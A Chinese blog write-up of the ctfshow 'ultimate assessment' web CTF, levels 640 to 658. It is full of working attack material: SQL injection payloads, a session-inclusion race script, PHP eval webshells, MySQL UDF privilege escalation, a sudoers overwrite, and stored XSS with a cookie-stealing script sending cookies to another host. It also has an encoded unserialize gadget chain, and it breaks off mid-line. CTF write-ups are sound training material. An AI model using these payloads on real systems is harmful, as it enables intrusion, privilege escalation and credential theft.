---
title: ctfshow-终极考核
id: ctfshow-终极考核
date: 2021-12-15 13:23:30
sidebar_position: 17
---

<!-- more -->

官方wp出啦：[CTFshow web入门 终极考核 (shimo.im)](https://shimo.im/docs/3XYdJp3RwQw6kHCx/read)

## 640

打开页面就是
![](https://i.loli.net/2021/09/05/zKINfRQldDoL8M6.png)

## 641

在index.php标头里
![](https://i.loli.net/2021/09/05/jRdzg9CWrxwMtBo.png)

## 642

index.php查看源代码，看到关键目录system36d

![](https://i.loli.net/2021/10/01/myNEZx6U98jqAhf.png)

访问该目录，右键查看源代码得到642

![](https://i.loli.net/2021/09/05/HJoD4yRN5TBh7EF.png)

## 644

在index.php会跳转至login.php，一个前端

可以看看js文件，得到密码0x36d
![](https://i.loli.net/2021/09/05/ULjl7ZgJ4wS12q6.png)

输入即得flag

![](https://i.loli.net/2021/10/01/yXpFlIkuGZAcCV5.png)

也可以在js文件里拿到flag644

同时看到跳转逻辑：访问`url/system36d/checklogin.php?s=10`即可跳转到后台，效果等同输入正确密码

![](https://i.loli.net/2021/09/05/iqSYr2GeIv5QHMy.png)



## 643

网络测试处可执行无参命令，ls一下发现当前目录有一个secret.txt

![](https://i.loli.net/2021/09/05/XEOgchtG43jrUpL.png)

643在当前文件夹的/secret.txt中，
访问url/system36d/secret.txt，url解码即可

## 645

在用户列表可见flag，利用数据备份可以查看，不记得是真是假了
(后面验证，这里确实是真的--)

![](https://i.loli.net/2021/09/05/AOQslInDMgVrbyz.png)

正解是：
访问robots.txt可以得到提示source.txt，访问得到关键代码

关键代码

```php
function existsUser($data,$username){
    return preg_match('/'.$username.'@[0-9a-zA-Z]+\|/', $data);
}
function delUser($data,$username){
    $ret = array(
        'code'=>0,
        'message'=>'删除成功'
    );
    if(existsUser($data,$username)>0 && $username!='admin'){
        $s = preg_replace('/'.$username.'@[0-9a-zA-Z]+\|/', '', $data);
        file_put_contents(DB_PATH, $s);	
    }else{
        $ret['code']=-1;
        $ret['message']='用户不存在或无权删除';
    }
    return json_encode($ret);
}
```

这里的删除逻辑是：(判断逻辑也是在$data中正则匹配)

1. 判断用户存在，且删除的用户不是admin
2. 正则替换：简而言之就是将原来的数据`$data`中符合正则`/($username)@[0-9a-zA-Z]+\|/`的地方
   替换为`空`
   赋值给$s后再写入DB_PATH中，从而实现删除

正则之所以这样设置，可以看之前提取的备份文件

可以看到数据是这样存储的：

`username1@password1|username2@password2|xxx@xxx|...`

![](https://i.loli.net/2021/10/02/Cx4QwiOIbmYT2K8.png)

那么正则匹配的就是：`用户名@密码|`

再说获取flag：
因为正则部分拼接了$usernmae,那么`正则就可控`
我们可以传入符号正则的东西，在$data中删除我们想要删除的东西，从而把flag显示出来

那么这里就可以构造正则将admin前面的数据全部删除，
让flag显示在用户名处

```
url/system36d/users.php?action=del&username=aab.*admin@|
```

删除成功后再次访问：

![](https://i.loli.net/2021/10/02/LeBEcJF9m74TtO8.png)

可以再次数据管理-》数据备份看一下，只剩下flag了
所以可以直接导出数据就有了呵呵~，不过这就是ctf的乐趣嘛

![](https://i.loli.net/2021/10/02/ivnyYtHWJcP2Thx.png)

## 646

![](https://i.loli.net/2021/09/05/T4jiDItLz1d3oQf.png)

远程更新处，需填入645的flag作key，
提示地址不可达，但显然执行成功了，

抓包修改一下：修改update_address可以得到main.php的源码，根据包含信息，查看init.php的源码，拿到645和646的flag
![](https://i.loli.net/2021/09/05/8Jj2OpF1ZxQi5oa.png)



## 647

为方便审计，将获得的源码去转义：[在线字符串转义 (lzltool.com)](http://www.lzltool.com/Escape/StringEscape)

结合之前的无参数rce，ls一下当前目录：

```
checklogin.php dbindex.php init.php login.php logout.php main.php secret.txt static update.php update2.php users.php util
```

篇幅问题，只贴647取的关键代码

```php
# /system36d/checklogin.php
$s=$_GET['s'];
setcookie('uid',intval($s));
$_SESSION['user_id']=intval($s);
header('location:main.php');
```




```php
# /system36d/users.php
$a=$_GET['action'];switch ($a) {        
# ...
    case 'evilString':
        evilString($_GET['m']);
        break;
}function evilString($m){
    $key = '372619038';
    $content = call_user_func($m);
    if(stripos($content, $key)!==FALSE){
        echo shell_exec('cat /FLAG/FLAG647');
    }else{
        echo 'you are not 372619038?';
    }
}
```

stripos不区分大小写，发现则返回字符串位置（从0开始），未发现则返回false，也就是要求$content即call_user_func($m)有372619038的结果

可以在checklogin.php处设置session值，然后调用session_encode:

```
url/system36d/checklogin.php?s=372619038
```

```
url/system36d/users.php?action=evilString&m=session_encode
```

![](https://i.loli.net/2021/10/02/bKwrMOJZamAj315.png)



## 648

```php
# /system36d/users.php
$a=$_GET['action'];
switch ($a) {
        # ...
    case 'evilClass':
        evilClass($_GET['m'],$_GET['key']);
        break;
}
function evilClass($m,$k){
    class ctfshow{
        public $m;
        public function __construct($m){
            $this->$m=$m;
        }
    }
    $ctfshow=new ctfshow($m);
    $ctfshow->$m=$m;
    if($ctfshow->$m==$m && $k==shell_exec('cat /FLAG/FLAG647')){
        echo shell_exec('cat /FLAG/FLAG648');
    }else{
        echo 'mmmmm?';
    }
}
```

可变变量覆盖，好像传什么都可以

```
url/system36d/users.php?action=evilClass&key=flag_647=ctfshow{e6ad8304cdb562971999b476d8922219}&m=
```

![](https://i.loli.net/2021/10/02/YF1IlajrZmpTyVq.png)



## 649

```php
# /system36d/users.php
$a=$_GET['action'];
switch ($a) {
        # ...
    case 'evilNumber':
        evilNumber($_GET['m'],$_GET['key']);
        break;
}
function getArray($total, $times, $min, $max)
{
    $data = array();
    if ($min * $times > $total) {
        return array();
    }
    if ($max * $times < $total) {
        return array();
    }
    while ($times >= 1) {
        $times--;
        $kmix = max($min, $total - $times * $max);
        $kmax = min($max, $total - $times * $min);
        $kAvg = $total / ($times + 1);
        $kDis = min($kAvg - $kmix, $kmax - $kAvg);
        $r = ((float)(rand(1, 10000) / 10000) - 0.5) * $kDis * 2;
        $k = round($kAvg + $r);
        $total -= $k;
        $data[] = $k;
    }
    return $data;
}
function evilNumber($m,$k){
    $number = getArray(1000,20,10,999);
    if($number[$m]==$m && $k==shell_exec('cat /FLAG/FLAG648')){
        echo shell_exec('cat /FLAG/FLAG649');
    }else{
        echo 'number is right?';
    }
}
```

不给m赋值即可，$number[]==$m，都为空

```
url/system36d/users.php?action=evilNumber&key=flag_648=ctfshow{af5b5e411813eafd8dc2311df30b394e}&m=
```

![](https://i.loli.net/2021/10/02/OFBG6PJkaSVnMEu.png)



## 650

```php
# /system36d/users.php
$a=$_GET['action'];
switch ($a) {
        # ...
    case 'evilFunction':
        evilFunction($_GET['m'],$_GET['key']);
        break;
}
function evilFunction($m,$k){
    $key = 'ffffffff';
    $content = call_user_func($m);
    if(stripos($content, $key)!==FALSE && $k==shell_exec('cat /FLAG/FLAG649')){
        echo shell_exec('cat /FLAG/FLAG650');
    }else{
        echo 'you are not ffffffff?';
    }
}
```

找返回值中存在ffffffff的函数：

```
url/system36d/users.php?action=evilFunction&key=flag_649=ctfshow{9ad80fcc305b58afbb3a0c2097ac40ef}&m=phar::createDefaultStub
```

![](https://i.loli.net/2021/10/02/12Mu36JTGPLkBb5.png)

![](https://i.loli.net/2021/10/02/m2KLHwqJiBY4gDl.png)



## 651

```php
# /system36d/users.php
$a=$_GET['action'];
switch ($a) {
        # ...
    case 'evilFunction':
        evilFunction($_GET['m'],$_GET['key']);
        break;
}
function evilArray($m,$k){
    $arrays=unserialize($m);
    if($arrays!==false){
        if(array_key_exists('username', $arrays) && in_array('ctfshow', get_object_vars($arrays)) &&  $k==shell_exec('cat /FLAG/FLAG650')){
            echo shell_exec('cat /FLAG/FLAG651');
        }else{
            echo 'array?';
        }
    }
}
```

会反序列化传入的m

判断条件：

1. 检查键值中是否有username这个键值
2. 数组中存在ctfshow

传一个序列化数据就可以：

```php
<?phpclass ctfshow{    public $username="ctfshow";}$a=new ctfshow();echo serialize($a);
```

得到`O:7:"ctfshow":1:{s:8:"username";s:7:"ctfshow";}`

```
url/system36d/users.php?action=evilArray&key=flag_650=ctfshow{5eae22d9973a16a0d37c9854504b3029}&m=O:7:"ctfshow":1:{s:8:"username";s:7:"ctfshow";}
```

![](https://i.loli.net/2021/10/02/WDkBMmG74rHTPbz.png)



## 652

```php
# /page.php
<?php
    error_reporting(0);
include __DIR__.DIRECTORY_SEPARATOR.'system36d/util/dbutil.php';
$id = isset($_GET['id'])?$_GET['id']:'1';
// 转义'来实现防注入$id = addslashes($id);$name = db::get_username($id);?>
```

```php
# /system36d/util/dbutil.php
<?php
    class db{
    private static $host='localhost';
    private static $username='root';
    private static $password='root';
    private static $database='ctfshow';
    private static $conn;
    public static function get_key(){
        $ret = '';
        $conn = self::get_conn();
        $res = $conn->query('select `key` from ctfshow_keys');
        if($res){
            $row = $res->fetch_array(MYSQLI_ASSOC);
        }
        $ret = $row['key'];
        self::close();
        return $ret;
    }
    public static function get_username($id){
        $ret = '';
        $conn = self::get_conn();
        $res = $conn->query("select `username` from ctfshow_users where id = ($id)");
        if($res){
            $row = $res->fetch_array(MYSQLI_ASSOC);
        }
        $ret = $row['username'];
        self::close();
        return $ret;
    }
    private static function get_conn(){ 
        if(self::$conn==null){
            self::$conn = new mysqli(self::$host, self::$username, self::$password, self::$database);
        }
        return self::$conn;
    }
    private static function close(){
        if(self::$conn!==null){
            self::$conn->close();
        }
    }
}
```

使用addslashes转义：
单引号（`'`）、双引号（`"`）、反斜线（`\`）与 NULL（**`null`** 字符）

```php
'select `key` from ctfshow_keys'"select `username` from ctfshow_users where id = ($id)"
```

但是sql语句中并没有使用这些符合，由此构造sql语句注入

```
# 表：ctfshow_keys,ctfshow_secret,ctfshow_users
?id=10) union select group_concat(table_name) from information_schema.tables where table_schema=database() and 1 =(1

# flag
?id=10) union select * from `ctfshow_secret` where 1 =(1# key?id=10) union select * from `ctfshow_keys` where 1 =(1
```

注入，拿flag652和key(给653)

```
url/page.php?id=10) union select secret as username from ctfshow_secret where 1 =(1
```

![](https://i.loli.net/2021/10/02/bdlQOAW7kX5eRqM.png)



```
url/page.php?id=10) union select `key` as username from ctfshow_keys where 1 =(1
```

![](https://i.loli.net/2021/10/02/ebDS8mFBoARVaIf.png)

key_is_here_you_know



## 653

### 解法1

用flag651和652拿到的key，可以进行文件包含

```php
# /var/www/html/system36d/util/common.php
<?php
    include 'dbutil.php';
if($_GET['k']!==shell_exec('cat /FLAG/FLAG651')){
    die('651flag未拿到');
}
if(isset($_POST['file']) && file_exists($_POST['file'])){
    if(db::get_key()==$_POST['key']){
        include __DIR__.DIRECTORY_SEPARATOR.$_POST['file'];
    }
}
```

利用session文件包含getshell

```python
import requests
import io
import threading

url = "http://db1b17bf-5a63-4e5e-866f-b6ba412a9df9.challenge.ctf.show:8080/system36d/util/common.php?k=flag_651=ctfshow{a4c64b86d754b3b132a138e3e0adcaa6}"
url2 = "http://db1b17bf-5a63-4e5e-866f-b6ba412a9df9.challenge.ctf.show:8080/index.php"
sessionid = "na0h"
data = {
    'key': 'key_is_here_you_know',
    'file': '../../../../../tmp/sess_' + sessionid,
    # /var/www/html/system36d/util/dbutil.php
    '1': '''file_put_contents('sss.php','<?php eval($_POST[1]);?>');'''
}


def write(session):
    filebytes = io.BytesIO(b'a' * 1024 * 50)
    while True:
        resp = session.post(url2,
                            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST[1]);?>'},
                            files={'file': ('na0h.png', filebytes)},
                            cookies={'PHPSESSID': sessionid})
        print("[*]writing...")


def read(session):
    while True:
        resp = session.post(url, data=data, cookies={'PHPSESSID': sessionid})
        if 'na0h.png' or 'offset: 1' in resp.text:
            print(resp.text)
            event.clear()
        else:
            print("[*]status:" + str(resp.status_code))


if __name__ == "__main__":
    event = threading.Event()
    with requests.session() as session:
        for i in range(5):
            threading.Thread(target=write, args=(session,)).start()
        for i in range(5):
            threading.Thread(target=read, args=(session,)).start()
    event.set()
```

disable_function禁用了常见的命令执行函数，但可以用反引号

![](https://i.loli.net/2021/10/02/MJCjvLnNPuTVUE6.png)

或者哥斯拉也可以

![](https://i.loli.net/2021/10/02/HsZglR9p4wf8dmK.png)

但权限只有www-data，这里顺便讲一下关于webshell的权限问题：

webshell是通过web服务器对应的语言里面的函数执行的命令，那么你的web服务是用什么权限运行的，你的webshell就是什么权限



### 解法2

补：条件竞争G了，只能换个办法，还是文件包含，先回头看看哪里能写东西

可以目录穿越，但存在`open_basedir`: `/var/www/html:/tmp`，写马的时候注意

> 又看一遍，发现用户那可以写东西，而且好像是用文件存的数据库，那么
>
> ```php
> # system36d/init.php
> <?php
> /*
> # -*- coding: utf-8 -*-
> # @Author: h1xa
> # @Date:   2021-07-31 15:28:30
> # @Last Modified by:   h1xa
> # @Last Modified time: 2021-07-31 22:09:59
> # @email: h1xa@ctfer.com
> # @link: https://ctfer.com
> */
> define('DB_PATH', __DIR__.'/db/data_you_never_know.db');
> define('FLAG645','flag645=ctfshow{28b00f799c2e059bafaa1d6bda138d89}');
> define('FLAG646','flag646=ctfshow{5526710eb3ed7b4742232d6d6f9ee3a9}');
> ```

考虑包含`/var/www/html/system36d/db/data_you_never_know.db`

利用这玩意把咱们写的马丢上去再包含就行

```php
<?php eval($_POST[1]);?>
```

![](https://i.loli.net/2021/11/30/w91VFQy7K2sfenc.png)

```
url/system36d/util/common.php?k=flag_651=ctfshow{a4c64b86d754b3b132a138e3e0adcaa6}

POST:
key=key_is_here_you_know&file=../../../../../../var/www/html/system36d/db/data_you_never_know.db&1=echo `ls /`;
```

![](https://i.loli.net/2021/11/30/z8O5LgEbYyUX7oF.png)

发现有点麻烦--，直接file_put_contents()写了个马

```php
file_put_contents('a.php','<?php eval($_POST[1]);?>'); 
```

然后连接就行



## 654

10.7

摸索了两天，一开始闭着眼睛想弹shell，后来发现这台机子不出网，问了下群主，确实只开了80端口；不过也学会msf的更多用法--



11.30

忙了好久，今天又重新捡起来一下

还是问了下yuntian师傅，知道mysql -udf提权QAQ，之前看的方向都错了

但是哥斯拉和冰蝎连又爆了，蚁剑连上数据库，但是都好像有点问题==

（不懂是什么原因，非常奇怪了）

因为udf提权要对数据库进行操作，但我用webshell管理工具都抽风了

自己写了个执行sql语句的东东，但确实不方便==（蚁剑传上去就行）

```php
<?php

    $dsn  = 'mysql:host=localhost;dbname=ctfshow';
    $user = 'root';
    $pwd  = 'root';
    try{
        $obj = new PDO($dsn,$user,$pwd);
    }catch(PDOException $e){
        echo 'Could not connect to DB:'.$e -> getMessage();
    }

    $sql = $_GET[1];
    $res = $obj->prepare($sql);
    $res->execute();
    $result = $res->fetch(PDO::FETCH_ASSOC);

    while ($row = $res -> fetch(PDO::FETCH_ASSOC)){
        print_r($row);
    }
    
?>
```

然后又去找了些大马，不过可能由于disable_function的存在，大马也不太可

然后在国光师傅的这篇文章找到办法：

[MySQL 漏洞利用与提权 | 国光 (sqlsec.com)](https://www.sqlsec.com/2020/11/mysql.html)

利用Navicat的 tunnel 隧道脚本连接即可，具体看师傅的博客吧~

然后就是udf提权了，确实狠狠的学到了

![](https://i.loli.net/2021/11/30/cf1G3igXRuWvdCF.png)



不过这里由于`secure_file_priv：/root`无法在sql将动态链接库写入插件目录下

直接在蚁剑传上去就行了，因为open_basedir的原因，无法直接传到插件目录下，

先传到允许目录用cp命令写入

> ps：这里我忘记看这个目录的所有者了，以为是root创建的，自己没权限，
>
> 属于一叶障目了，然后傻傻跑去问yuntian师傅，下次注意信息收集的地方！！
>
> ![](https://i.loli.net/2021/12/01/qQ6O8IJgHaui5G7.png)

这里uname -a看了下，传64位的udf，然后跟着国光师傅走就行

```mysql
# 创建自定义函数（记得是在mysql的命令行界面，不是查询==）
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';

# 执行命令
select sys_eval('ls');
```

然后直接sudo就行，感动的我只能说绝绝子了

![](https://i.loli.net/2021/12/01/K6VAxpbsUFIuHeh.png)

> 记一下操作
>
> ```
> /system36d/checklogin.php?s=10
> 
> 
> system36d/util/common.php?k=flag_651=ctfshow{a4c64b86d754b3b132a138e3e0adcaa6}
> 
> POST:
> key=key_is_here_you_know&file=../../../../../../var/www/html/system36d/db/data_you_never_know.db&1=echo `ls /`;
> 
> 
> 
> cp lib_mysqludf_sys_64.so /usr/lib/mariadb/plugin/udf.so
> 
> 
> CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';
> 
> 
> select sys_eval('sudo cp /var/www/html/system36d/util/sudoers /etc/sudoers');
> ```





## 655

为了操作方便，

修改`/etc/sudoers`把www-data也加个sudo

但可能是占用还是语法问题，尝试>>追加无果

先cat内容，再加上一条这个：`www-data ALL=(ALL:ALL) NOPASSWD:ALL`

然后传上去，cp一下覆盖掉~，就可以用www-data来sudo了

```mysql
select sys_eval('sudo cp /var/www/html/system36d/util/sudoers /etc/sudoers');
```

![](https://i.loli.net/2021/12/01/D8bvUykNgCJQELq.png)

后面就是进内网咯



12.12

又写了两周的课设，一直想着搭隧道来着

但因为机子是不出网的，而且只开了80端口，之前群主其实也和俺说过
（不过还是傻傻的看了一天内网转发，也学到很多好用的东东）

存活主机写个sh脚本ping就好了：

（要注意每次开靶机分配的内网ip不一样，记得自己改）

```php
#!/bin/bash
ip=1
while [ $ip != "254" ]; do
    ping 172.2.7.$ip -c 2 | grep -q "ttl=" && echo "172.2.7.$ip yes" || echo "172.2.7.$ip no" >/dev/null 2>&1
    ip=`expr "$ip" "+" "1"`
done
```

扫c段发现1-7能通

![](https://s2.loli.net/2021/12/12/iptVW28XGanSxhU.png)

curl了一遍发现应该是在5，不能内网转发，但是俺可以在浏览器用🐎直接curl（yuntian师傅直接提示了phpinfo.php，也省去俺扫目录了QAQ）

![](https://s2.loli.net/2021/12/12/28UKemT9zOE7rxF.png)



## 656

不过还是扫一遍，发现了很多好东西

![](https://s2.loli.net/2021/12/12/6d4WXOYMtVsjZe5.png)

![](https://s2.loli.net/2021/12/12/vOCsAlGf63Pr7Mb.png)



访问robots.txt发现：`disallowed /public/`，访问之，有个Readme.txt

![](https://s2.loli.net/2021/12/12/guOxQvBLlzpAm12.png)

flag.php没啥东西，应该是被调用的，还是看www.zip吧

先把www.zip拷到这台机子，再访问下下来

```
curl 172.2.7.7/www.zip > www.zip
```

得到index.php

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-08-04 15:54:48
# @Last Modified by:   h1xa
# @Last Modified time: 2021-08-05 00:43:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

include 'dbutil.php';
include 'flag.php';

error_reporting(0);
session_start();


$a=$_GET['action'];

switch ($a){
    case 'login':
    	$ret = login($_GET['u'],$_GET['p']);
        break;
    case 'index':
    	$ret = index();
        break;
    case 'main':
    	$ret = main($_GET['m']);
    	break;
    default:
         $ret = json_encode(array(
		'code'=>0,
		'message'=>'数据获取失败',
		));
		break;
}


echo $ret;


function index(){
    $html='管理员请注意，下面是最近登陆失败用户：<br>';
    $ret=db::query('select username,login_time,login_ip from ctfshow_logs  order by id desc limit 3');
    foreach ($ret as $r) {
    	$html .='------------<br>用户名: '.htmlspecialchars($r[0]).'<br>登陆失败时间: '
    	.$r[1]
    	.'<br>登陆失败IP: '
    	.$r[2].
    	'<br>------------<br>';
    }
    return $html;
    
}

function login($u,$p){
	$ret = array(
	'code'=>0,
	'message'=>'数据获取失败',
	);
	$u = addslashes($u);
	$p = addslashes($p);
	$res = db::query("select username from ctfshow_users where username = '$u' and password = '$p'");
	$date = new DateTime('now');
	$now = $date->format('Y-m-d H:i:s');
	$ip = addslashes(gethostbyname($_SERVER['HTTP_X_FORWARDED_FOR']));
	

	if(count($res)==0){
 		 db::insert("insert into `ctfshow_logs` (`username`,`login_time`,`login_ip`) values ('$u','$now','$ip')");
		 $ret['message']='账号或密码错误';
		 return json_encode($ret);
	}

	if(!auth()){
		$ret['message']='AuthKey 错误';
	}else{
		$ret['message']='登陆成功';
		$_SESSION['login']=true;
		$_SESSION['flag_660']=$_GET['flag'];
	}

	return json_encode($ret);


}

function auth(){
	$auth = base64_decode($_COOKIE['auth']);
	return $auth==AUTH_KEY;
}

function getFlag(){
	return  FLAG_657;
}

function testFile($f){
	$result = '';
	$file = $f.md5(md5(random_int(1,10000)).md5(random_int(1,10000))).'.php';
	if(file_exists($file)){
		$result = FLAG_658;
	}
	return $result;

}


function main($m){
	$ret = array(
	'code'=>0,
	'message'=>'数据获取失败',
	);
	if($_SESSION['login']==true){
		
		switch ($m) {
			case 'getFlag':
				$ret['message']=getFlag();
				break;
			case 'testFile':
				$ret['message']=testFile($_GET['f']);
				break;
			default:
				# code...
				break;
		}
		

	}else{
		$ret['message']='请先登陆';
	}

	return json_encode($ret);
}
```

看了下好像没东东，但是输入失败的话会被传到页面中，可以调用index看，考虑插个xss，获取cookie就能实现能登录了？



```php
$u = addslashes($u);
$p = addslashes($p);
$res = db::query("select username from ctfshow_users where username = '$u' and password = '$p'");
$date = new DateTime('now');
$now = $date->format('Y-m-d H:i:s');
$ip = addslashes(gethostbyname($_SERVER['HTTP_X_FORWARDED_FOR']));


if(count($res)==0){
    db::insert("insert into `ctfshow_logs` (`username`,`login_time`,`login_ip`) values ('$u','$now','$ip')");
    $ret['message']='账号或密码错误';
    return json_encode($ret);
}
```

用户名和密码因为是get传参存在转义，有点不好操作
发现ip是检测头部中的xff，那么可以在ip这里进行操作

> gethostbyname：返回主机名 `hostname` 对应的 IPv4 互联网地址。
>
> 成功时返回 IPv4 地址，**失败时原封不动返回 `hostname` 字符串。**

因为失败时会原封不动返回

那么：

```
curl -H 'X-Forwarded-For: <script>alert(1);</script>' '172.2.119.5/index.php?action=login&u=333'
```

成功了~，然后就是弹一下cookie看看后台会不会有bot点击

![](https://s2.loli.net/2021/12/13/FbMQjt8A9nd4KJx.png)



不过我记得群主过滤了xss，那么xss平台好像就不能用了，但是因为addslashes的存在，单双引号又会被弄掉

研究了一下发现xss平台的payload就是访问他的js文件，那么我把这个js放到我vps上就行，接收还是在xss平台那（后面得搭一个自己的了~）

后面发现弹不到啊，又想起来机子都是不出网的，那么用第一台机子接收就好了：

> 先传个php和js文件上去
>
> cc.php
>
> ```php
> <?php
> $content = $_GET[1];
> if(isset($content)){
>      file_put_contents('cookie.txt',$content);
> }else{
>      echo 'no date input';
> }
> ```
>
> mjs
>
> ```javascript
> var img = new Image();
> img.src = "http://172.2.119.4/cc.php?1="+document.cookie;
> document.body.append(img);
> ```
>
> 然后发送请求把他写进去：
>
> ```
> curl -H 'X-Forwarded-For: <sCRiPt/SrC=//172.2.119.4/mjs></script>' '172.2.119.5/index.php?action=login&u=321'
> ```

![](https://s2.loli.net/2021/12/13/IwEixfSuKzVB1TN.png)

弹到了：

![](https://s2.loli.net/2021/12/13/LI6G9TU4mYs71bN.png)

```
PHPSESSID=lf274jqj4h5mkoali1ka3ggjec; auth=ZmxhZ182NTY9Y3Rmc2hvd3tlMGI4MGQ2Yjk5ZDJiZGJhZTM2ZjEyMWY3OGFiZTk2Yn0=
```

解码得到：flag_656=ctfshow{xxx}



## 657

看index.php：

```php
#...
	if(!auth()){
		$ret['message']='AuthKey 错误';
	}else{
		$ret['message']='登陆成功';
		$_SESSION['login']=true;
		$_SESSION['flag_660']=$_GET['flag'];
	}
	return json_encode($ret);
#...
function getFlag(){
	return  FLAG_657;
}
#...
function main($m){
#...
	if($_SESSION['login']==true){
		switch ($m) {
			case 'getFlag':
				$ret['message']=getFlag();
				break;
				#...
		}
	return json_encode($ret);
}
```

把弹到的session和cookie一起传进去就行：

```
curl -H 'Cookie: PHPSESSID=lf274jqj4h5mkoali1ka3ggjec; auth=ZmxhZ182NTY9Y3Rmc2hvd3tlMGI4MGQ2Yjk5ZDJiZGJhZTM2ZjEyMWY3OGFiZTk2Yn0=' '172.2.119.5/index.php?action=main&m=getFlag'
```

![](https://s2.loli.net/2021/12/15/YLBknibuDdCoKZl.jpg)

## 658

```php
function testFile($f){
	$result = '';
	$file = $f.md5(md5(random_int(1,10000)).md5(random_int(1,10000))).'.php';
	if(file_exists($file)){
		$result = FLAG_658;
	}
	return $result;
```

```
curl -H 'Cookie: PHPSESSID=1addmcbia5kdeqti30993323bg; auth=ZmxhZ182NTY9Y3Rmc2hvd3tlMGI4MGQ2Yjk5ZDJiZGJhZTM2ZjEyMWY3OGFiZTk2Yn0=' '172.2.119.5/index.php?action=main&m=testFile&f=./a'
```

不会整，于是曲线救国：

`open_basedir：/var/www/html:/tmp:/var/oa/`

```
1=
echo shell_exec('a=TyUzQTMyJTNBJTIyQ29kZWNlcHRpb24lNUNFeHRlbnNpb24lNUNSdW5Qcm9jZXNzJTIyJTNBMiUzQSU3QnMlM0E5JTNBJTIyJTAwJTJBJTAwb3V0cHV0JTIyJTNCTyUzQTIyJTNBJTIyRmFrZXIlNUNEZWZhdWx0R2VuZXJhdG9yJTIyJTNBMSUzQSU3QnMlM0ExMCUzQSUyMiUwMCUyQSUwMGRlZmF1bHQlMjIlM0JzJTNBNSUzQSUyMmpva2VyJTIyJTNCJTdEcyUzQTQzJTNBJTIyJTAwQ29kZWNlcHRpb24lNUNFeHRlbnNpb24lNUNSdW5Qcm9jZXNzJTAwcHJvY2Vzc2VzJTIyJTNCYSUzQTElM0ElN0JpJTNBMCUzQk8lM0EyMiUzQSUyMkZha2VyJTVDRGVmYXVsdEdlbmVyYXRvciUyMiUzQTElM0ElN0JzJTNBMTAlM0ElMjIlMDAlMkElMDBkZWZhdWx0JTIyJTNCTyUzQTI4JTNBJTIyR3V6emxlSHR0cCU1Q1BzcjclNUNBcHBlbmRTdHJlYW0lMjIlM0EyJTNBJTdCcyUzQTM3JTNBJTIyJTAwR3V6emxlSHR0cCU1Q1BzcjclNUNBcHBlbmRTdHJlYW0lMDBzdHJlYW1zJTIyJTNCYSUzQTElM0ElN0JpJTNBMCUzQk8lM0EyOSUzQSUyMkd1enpsZUh0dHAlNUNQc3I3JTVDQ2FjaGluZ1N0cmVhbSUyMiUzQTIlM0ElN0JzJTNBNDMlM0ElMjIlMDBHdXp6bGVIdHRwJTVDUHNyNyU1Q0NhY2hpbmdTdHJlYW0lMDByZW1vdGVTdHJlYW0lMjIlM0JPJTNBMjIlM0ElMjJGYWtlciU1Q0RlZmF1bHRHZW5lcmF0b3IlMjIlM0ExJTNBJTdCcyUzQTEwJTNBJTIyJTAwJTJBJTAwZGVmYXVsdCUyMiUzQmIlM0EwJTNCJTdEcyUzQTYlM0ElMjJzdHJlYW0lMjIlM0JPJTNBMjYlM0ElMjJHdXp6bGVIdHRwJTVDUHNyNyU1Q1B1bXBTdHJlYW0lMjIlM0EzJTNBJTdCcyUzQTM0JTNBJTIyJTAwR3V6emxlSHR0cCU1Q1BzcjclNUNQdW1wU3RyZWFtJTAwc291cmNlJTIyJTNCQyUzQTMyJTNBJTIyT3BpcyU1Q0Nsb3N1cmUlNUNTZXJpYWxpemFibGVDbG9zdXJlJTIyJTNBMTgzJTNBJTdCYSUzQTUlM0ElN0JzJTNBMyUzQSUyMnVzZSUyMiUzQmElM0EwJTNBJTdCJTdEcyUzQTglM0ElMjJmdW5jdGlvbiUyMiUzQnMlM0EyOCUzQSUyMmZ1bmN0aW9uJTI4JTI5JTdCZXZhbCUyOCUyNF9QT1NUJTVCMSU1RCUyOSUzQiU3RCUyMiUzQnMlM0E1JTNBJTIyc2NvcGUlMjIlM0JzJTNBMjYlM0ElMjJHdXp6bGVIdHRwJTVDUHNyNyU1Q1B1bXBTdHJlYW0lMjIlM0JzJTNBNCUzQSUyMnRoaXMlMjIlM0JOJTNCcyUzQTQlM0ElMjJzZWxmJTIyJTNCcyUzQTMyJTNBJTIyMDAwMDAwMDAyOTUxNDVkZTAwMDAwMDAwMDZlOWY1OTElMjIlM0IlN0QlN0RzJTNBMzIlM0ElMjIlMDBHdXp6bGVIdHRwJTVDUHNyNyU1Q1B1bXBTdHJlYW0lMDBzaXplJTIyJTNCaSUzQS0xMCUzQnMlM0EzNCUzQSUyMiUwMEd1enpsZUh0dHAlNUNQc3I3JTVDUHVtcFN0cmVhbSUwMGJ1ZmZlciUyMiUzQk8lM0EyMiUzQSUyMkZha2VyJTVDRGVmYXVsdEdlbmVyYXRvciUyMiUzQTElM0ElN0JzJTNBMTAlM0ElMjIlMDAlMkElMDBkZWZhdWx0JTIyJTNCcyUzQTElM0ElMjJqJTIyJTNCJTdEJTdEJTdEJTdEcyUzQTM4JTNBJTIyJTAwR3V6emxlSHR0cCU1Q1BzcjclNUNBcHBlbmRTdHJlYW0lMDBzZWVrYWJsZSUyMiUzQmIlM0ExJTNCJTdEJTdEJTdEJTdE;
b=dmFyX2R1bXAoc2NhbmRpcigkX1BPU1RbMl0pKTsK;
curl "172.2.133.5:8888/index.php?r=site/unserialize%26key=flag_663=ctfshow\{fa5cc1fb0bfc986d1ef150269c0de197\}"  -d "_csrf=a_NNxLPrVGtxteT6o7pCERw2sYqscNEGH2iLxPyQTAYtoA-OnogXHDbfio7GyXUnX0frsvQBqDAuXsy9kfQePw==" -d "UnserializeForm[ctfshowUnserializeData]=`echo "$a" | base64 -d`" -d "1=`echo "$b" | base64 -d`phpinfo();" -d "2=glob://../../www/html/*"
');
```

那么伪协议读源码即可：

```
1=
